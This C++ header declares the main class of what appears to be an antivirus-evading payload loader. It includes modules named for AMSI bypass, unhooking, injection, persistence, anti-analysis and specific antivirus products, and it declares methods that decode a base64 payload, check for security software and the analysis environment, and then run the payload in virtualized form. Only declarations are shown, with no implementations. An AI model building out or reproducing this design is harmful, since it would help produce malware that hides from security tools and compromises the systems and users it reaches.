#pragma once
#include "amsi.h"
#include "unhooker.h"
#include "injection.h"
#include "persistence.h"
#include "antianalysis.h"
#include "bitdefender.h"
#include "eset.h"
#include "hbp.h"
#include "threadpool.h"
#include "virtualizer.h"
#include "pipeline.h"
#include "crypto.h"
#include <string>
#include <vector>
#include <Psapi.h>
#include <TlHelp32.h>
#pragma comment(lib,"Psapi.lib")
class mainprogram {
private:
    std::string base64_decode(const std::string& encoded);
    bool checkmodule(const std::wstring& modulename);
    bool checkavmodules();
    std::vector<BYTE> getpayload();
    bool checkenvironment();
    void cleanup();
    std::vector<BYTE> virtualize_payload(const std::vector<BYTE>& payload);
    bool execute_virtualized(const std::vector<BYTE>& virtualized);
public:
    void run();
};